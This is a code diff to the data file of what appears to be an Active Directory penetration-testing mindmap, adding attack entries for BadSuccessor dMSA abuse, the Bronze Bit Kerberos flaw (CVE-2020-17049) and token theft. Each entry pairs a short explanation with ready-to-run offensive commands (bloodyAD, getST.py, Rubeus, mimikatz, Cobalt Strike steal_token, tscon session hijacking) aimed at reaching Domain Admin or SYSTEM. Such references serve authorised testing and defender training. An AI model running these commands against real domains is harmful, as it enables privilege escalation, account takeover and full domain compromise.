@@ -1314,6 +1314,22 @@ var AD_MAP_V2 = {
           ],
           outcomes: [{ label: "Admin", color: "#f4b6b6" }],
           moveTo: []
+        },
+        {
+          id: "acl-badsuccessor",
+          title: "BadSuccessor — dMSA abuse (Server 2025)",
+          theory: null,
+          cve: { id: "BadSuccessor", label: "dMSA migration abuse — Akamai 2025, needs a Server 2025 DC" },
+          desc: "Delegated Managed Service Accounts (new in Server 2025) can be marked as the 'successor' of another account via msDS-ManagedAccountPrecededByLink. The KDC blindly trusts that link and issues the dMSA a PAC carrying the predecessor's SIDs — so with only create/write rights on an OU you create a dMSA, link it to a Domain Admin, and authenticate as that DA. No control over the victim object is needed.",
+          cmds: [
+            "# needs: CreateChild/write on any OU + at least one Windows Server 2025 DC",
+            "# enumerate writable OUs / existing dMSAs:",
+            "Get-ADServiceAccount -Filter * -Properties msDS-ManagedAccountPrecededByLink",
+            "# create + link + roast with SharpSuccessor / BadSuccessor.ps1 / bloodyAD:",
+            "bloodyAD -u <user> -p <pass> -d <domain> add dMSA <ou> <name> --supersede <victimDA>"
+          ],
+          outcomes: [{ label: "Domain Admin", color: "#f4b6b6" }],
+          moveTo: [{ section: "domain-admin", note: "the dMSA's PAC carries the DA's SIDs" }]
         }
       ]
     },
@@ -1387,7 +1403,11 @@ var AD_MAP_V2 = {
               "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'",
               "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>"
             ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
-            { label: "Self RBCD", note: "Like RBCD but without adding a computer account." }
+            { label: "Self RBCD", note: "Like RBCD but without adding a computer account." },
+            { label: "Bronze Bit — forge the forwardable flag", cve: "CVE-2020-17049", note: "On an unpatched KDC, S4U2proxy accepts a service ticket whose forwardable flag you flipped — so you can delegate even for users marked 'sensitive / cannot be delegated', or without protocol transition configured.", cmds: [
+              "getST.py -spn <spn>/<target> -impersonate Administrator -force-forwardable -dc-ip <dc_ip> '<domain>/<svc>$:<pass>'",
+              "Rubeus.exe s4u /self /impersonateuser:Administrator /bronzebit /ticket:<tgt> /msdsspn:<spn> /ptt"
+            ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] }
           ],
           outcomes: [],
           moveTo: []
@@ -1916,15 +1936,31 @@ var AD_MAP_V2 = {
         },
         {
           id: "aa-impersonate",
-          title: "Impersonate",
+          title: "Token theft & impersonation",
           theory: { label: "Windows Tokens & UAC", url: "theory/2026-08-18-windows-tokens-uac.html" },
           vuln: { label: "Token Impersonation", url: "vuln-detail.html?vuln=token-impersonation" },
           cve: null,
-          desc: "Steal or impersonate the token / session of another logged-on user.",
+          desc: "From local admin you can borrow any token on the host — impersonate a domain admin who has a session here, elevate to SYSTEM, or mint a network token from creds without logging on. The stolen token then authenticates to the domain as that user (MITRE T1134).",
           cmds: [],
           branches: [
-            { label: "Token impersonation", cmds: [
-              "msf> use incognito; impersonate_token <domain>\\<user>",
+            { label: "Steal a process token (admin -> another user / SYSTEM)", note: "Duplicate the token of a process owned by a higher-privileged or different user (OpenProcess -> OpenProcessToken -> DuplicateTokenEx). Needs an admin / SeDebug context. The go-to when a domain admin has a live session on a box you own.", cmds: [
+              "msf> use incognito; list_tokens -u; impersonate_token '<domain>\\\\<user>'",
+              "beacon> steal_token <pid>              # Cobalt Strike",
+              "Invoke-TokenManipulation -ImpersonateUser -Username '<domain>\\\\<user>'"
+            ], outcomes: [{ label: "User + Pass", color: "#4ade80" }] },
+            { label: "Make & impersonate a token from creds (no admin needed)", note: "LogonUser / make_token builds a network-auth token for a user whose password or hash you hold, with no interactive logon — then you act as them over SMB/WinRM/etc.", cmds: [
+              "beacon> make_token <domain>\\\\<user> <password>",
+              "runas /netonly /user:<domain>\\\\<user> cmd.exe"
+            ], outcomes: [{ label: "Lateral move", color: "#3b9ee5" }] },
+            { label: "Elevate to SYSTEM", note: "From a high-integrity admin context, grab a SYSTEM token.", cmds: [
+              "mimikatz # token::elevate",
+              "PsExec64.exe -s -i cmd.exe"
+            ], outcomes: [{ label: "Authority/System", color: "#4ade80" }] },
+            { label: "Extract a usable TGT with no elevation (Rubeus tgtdeleg)", note: "The GSS Kerberos delegation trick yields a forwardable TGT for the current user without admin; inject it and move with pass-the-ticket.", cmds: [
+              "Rubeus.exe tgtdeleg /nowrap",
+              "Rubeus.exe ptt /ticket:<base64>"
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "Hunt logged-on users (where to steal)", cmds: [
               "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
               "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
               "irs.exe list; irs.exe exec -p <pid> -c <command>"
@@ -1932,14 +1968,14 @@ var AD_MAP_V2 = {
             { label: "Impersonate with AD CS (Masky)", cmds: [
               "masky -d <domain> -u <user> {-p <password> || -k || -H <hash>} -ca <certificate_authority> <ip>"
             ], outcomes: [{ label: "NTLM", color: "#e8912e" }, { label: "Pass the hash / ticket / certificate", color: "#9ca3af" }] },
-            { label: "Impersonate an RDP session", cmds: [
+            { label: "Impersonate an RDP session (tscon)", cmds: [
               "psexec.exe -s -i cmd",
               "query user",
               "tscon.exe <id> /dest:<session_name>"
             ], outcomes: [{ label: "RDP", color: "#9ca3af" }] }
           ],
           outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "User + Pass", color: "#4ade80" }],
-          moveTo: []
+          moveTo: [{ section: "lateral-move", note: "move as the impersonated user" }]
         },
         {
           id: "aa-misc",
